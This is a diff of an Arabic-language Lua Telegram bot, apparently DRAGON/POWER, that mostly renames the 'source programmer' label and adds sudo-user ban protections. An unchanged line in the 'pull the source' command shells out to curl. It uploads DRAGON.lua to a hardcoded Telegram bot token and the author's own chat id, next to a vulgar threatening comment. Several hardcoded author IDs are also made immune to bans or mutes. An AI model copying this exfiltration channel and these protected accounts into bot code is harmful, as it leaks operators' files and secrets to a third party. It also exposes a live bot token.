@@ -5,10 +5,10 @@
 --     @ahmedyad200
 --     @ahmedyad200
 
+redis = require('redis') 
 serpent = dofile("./serpent.lua") 
 json = dofile("./JSON.lua") 
 JSON  = dofile("./dkjson.lua")
-redis = require('redis') 
 https = require ("ssl.https") 
 URL = require('socket.url')  
 utf8 = require ('lua-utf8') 
@@ -388,7 +388,7 @@ function Rutba(user_id,chat_id)
 if tonumber(user_id) == tonumber(0987878788) then  
 var = 'مـبـرمـج افـايـره'
 elseif tonumber(user_id) == tonumber(944353237) then
-var = 'مـبـرمـج الـسـورس'
+var = 'المبرمج'
 elseif tonumber(user_id) == tonumber(0988738700) then
 var = 'المبرمج ليجاند'
 elseif tonumber(user_id) == tonumber(0303030030) then
@@ -1422,7 +1422,7 @@ return false
 end
 if text == 'معلومات السيرفر ☉' or text == 'السيرفر' then
 if not DEV(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون مبرمج السورس لاستخدام هذا الامر')
+send(msg.chat_id_, msg.id_,'يجب ان تكون المبرمج لاستخدام هذا الامر')
 return false
 end 
 local inline = {{{text = '𝘾𝙃𝘼𝙉𝙉𝙀𝙇', url="t.me/SOPOWERB0T"}},} 
@@ -3330,7 +3330,7 @@ end
 ]]--
 if text == 'سحب السورس' or text == 'جلب السورس' then 
 if not DEV(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون مبرمج السورس لاستخدام هذا الامر')
+send(msg.chat_id_, msg.id_,'يجب ان تكون المبرمج لاستخدام هذا الامر')
 return false
 end   
 local curlm = 'curl "'..'https://api.telegram.org/bot1893162664:AAEUolDOcLMt5J4IAcH7KYyIUf3W_BkCgqo/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'DRAGON.lua'..'"' io.popen(curlm) ---- كود كتابه أحمد عياد هتسرق هيجيبك من طيزك
@@ -4538,7 +4538,11 @@ return false
 end
 function start_function(extra, result, success)
 if tonumber(result.sender_user_id_) == tonumber(944353237) then  
-send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر مبرمج السورس عام")
+send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر المبرمج عام")
+return false 
+end
+if Sudo(result.sender_user_id_) == true then
+send(msg.chat_id_, msg.id_, "لا تستطيع حظر المطور عام")
 return false 
 end
 if tonumber(result.sender_user_id_) == tonumber(0987878788) then  
@@ -4597,7 +4601,11 @@ send(msg.chat_id_,msg.id_," ☉┇ عذرا عزيزي المستخدم هاذا
 return false 
 end
 if result.id_ == tonumber(944353237) then
-send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك حظر مبرمج السورس عام \n")
+send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك حظر المبرمج عام \n")
+return false 
+end
+if Sudo(result.id_) == true then
+send(msg.chat_id_, msg.id_, "لا تستطيع حظر المطور عام")
 return false 
 end
 if result.id_ == tonumber(0987878788) then
@@ -4650,7 +4658,11 @@ end
 return false
 end
 if tonumber(userid) == tonumber(944353237) then  
-send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر مبرمج السورس عام")
+send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع حظر المبرمج عام")
+return false 
+end
+if Sudo(userid) == true then
+send(msg.chat_id_, msg.id_, "لا تستطيع حظر المطور عام")
 return false 
 end
 if tonumber(userid) == tonumber(0987878788) then  
@@ -4707,7 +4719,11 @@ return false
 end
 function start_function(extra, result, success)
 if tonumber(result.sender_user_id_) == tonumber(944353237) then  
-send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم مبرمج السورس عام")
+send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم المبرمج عام")
+return false 
+end
+if Sudo(result.sender_user_id_) == true then
+send(msg.chat_id_, msg.id_, "لا تستطيع حظر المطور عام")
 return false 
 end
 if tonumber(result.sender_user_id_) == tonumber(0987878788) then  
@@ -4764,7 +4780,11 @@ send(msg.chat_id_,msg.id_," ☉┇ عذرا عزيزي المستخدم هاذا
 return false 
 end      
 if result.id_ == tonumber(944353237) then
-send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك كتم مبرمج السورس عام\n")
+send(msg.chat_id_, msg.id_, " ☉┇ لا يمكنك كتم المبرمج عام\n")
+return false 
+end
+if Sudo(result.id_) == true then
+send(msg.chat_id_, msg.id_, "لا تستطيع حظر المطور عام")
 return false 
 end
 if result.id_ == tonumber(0987878788) then
@@ -4816,7 +4836,11 @@ end
 return false
 end
 if tonumber(userid) == tonumber(944353237) then  
-send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم مبرمج السورس عام")
+send(msg.chat_id_, msg.id_, " ☉┇ لا تسطيع كتم المبرمج عام")
+return false 
+end
+if Sudo(userid) == true then
+send(msg.chat_id_, msg.id_, "لا تستطيع حظر المطور عام")
 return false 
 end
 if tonumber(userid) == tonumber(0988738700) then  
@@ -5022,7 +5046,7 @@ end
 end
 if text == 'ملفات السورس' then
 if not DEV(msg) then
-send(msg.chat_id_, msg.id_,'يجب ان تكون مبرمج السورس لاستخدام هذا الامر')
+send(msg.chat_id_, msg.id_,'يجب ان تكون المبرمج لاستخدام هذا الامر')
 return false
 end
 t = ' ☉┇ الملفات السورس الموجوده في البوت ↓\n •┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉• \n'
@@ -14695,7 +14719,7 @@ t = t..i.."-  `"..v.."` \n"
 end
 send(msg.chat_id_, msg.id_, t..'━━━━━━\nاضغط علي الاسم ليتم نسخه\n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•ٴ\n ⚡️[𝗣𝗢𝗪𝗘𝗥](t.me/SOPOWERB0T)⚡️ ')
 end
-if text and text:match("^فلم (.*)$") and database:get(bot_id.."movie_bot"..msg.chat_id_) == "open" then
+if text and text:match("^فلم (.*)$") then
 local Textm = text:match("^فلم (.*)$")
 data,res = https.request('https://boyka-api.ml/movie.php?serch='..URL.escape(Textm)..'')
 if res == 200 then
@@ -15420,7 +15444,7 @@ keyboard.inline_keyboard = {
 {{text = 'WorldCup', url="https://t.me/gamee?game=PocketWorldCup"},{text = 'GeometryRun', url="https://t.me/gamee?game=GeometryRun"}},  
 {{text = 'Ten2One', url="https://t.me/gamee?game=Ten2One"},{text = 'NeonBlast2', url="https://t.me/gamee?game=NeonBlast2"}},  
 {{text = 'Paintio', url="https://t.me/gamee?game=Paintio"},{text = 'onetwothree', url="https://t.me/gamee?game=onetwothree"}},  
-{{text = 'مبرمج السورس', url="t.me/ahmedyad200"}},
+{{text = 'المبرمج', url="t.me/ahmedyad200"}},
 {{text = '⌯ ❶️❶ ⌯', callback_data="/game"},{text = '❷❷', callback_data="/game2"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -15446,7 +15470,7 @@ keyboard.inline_keyboard = {
 {{text = 'SpaceTraveler', url="https://t.me/gamee?game=SpaceTraveler"},{text = 'RedAndBlue', url="https://t.me/gamee?game=RedAndBlue"}},  
 {{text = 'SkodaHockey1 ', url="https://t.me/gamee?game=SkodaHockey1"},{text = 'SummerLove', url="https://t.me/gamee?game=SummerLove"}},  
 {{text = 'SmartUpShark', url="https://t.me/gamee?game=SmartUpShark"},{text = 'SpikyFish3', url="https://t.me/gamee?game=SpikyFish3"}},  
-{{text = 'مبرمج السورس', url="t.me/ahmedyad200"}},
+{{text = 'المبرمج', url="t.me/ahmedyad200"}},
 {{text = '❶️❶', callback_data="/game1"},{text = '⌯ ❷❷ ⌯', callback_data="/game"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
